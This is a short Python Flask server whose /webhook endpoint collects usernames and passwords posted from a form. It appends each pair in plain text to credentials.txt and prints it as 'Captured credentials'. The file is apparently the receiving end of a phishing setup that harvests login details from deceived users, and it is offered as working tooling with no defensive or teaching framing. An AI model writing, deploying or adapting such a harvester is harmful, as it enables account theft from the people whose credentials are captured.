
from flask import Flask, request  # type: ignore
import os

app = Flask(__name__)

# Path to the credentials file
file_path = os.path.join(os.getcwd(), "credentials.txt")

@app.route('/webhook', methods=['POST'])  # Correct route
def webhook():
    try:
        # Retrieve data from form submission
        data = request.form
        username = data.get('username', 'Unknown')
        password = data.get('password', 'Unknown')

        # Write the data to credentials.txt
        with open(file_path, "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        print(f"Captured credentials: Username={username}, Password={password}")

        return "Data received!", 200
    except Exception as e:
        print(f"Error: {e}")
        return "Error occurred!", 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)
